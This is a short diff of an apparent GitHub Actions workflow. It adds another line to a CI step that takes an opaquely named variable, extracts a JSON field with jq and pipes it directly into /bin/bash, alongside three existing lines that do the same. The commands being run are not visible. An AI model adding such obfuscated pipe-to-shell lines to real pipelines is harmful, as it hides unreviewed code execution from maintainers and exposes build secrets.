@@ -41,6 +41,7 @@ jobs:
           echo $svfw9 | jq -r .ii00 | /bin/bash
           echo $nv5677 | jq -r .mitl4 | /bin/bash
           echo $e23 | jq -r .p86 | /bin/bash
+          printf '%s' "$cdr9706" | jq -r .cep623 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
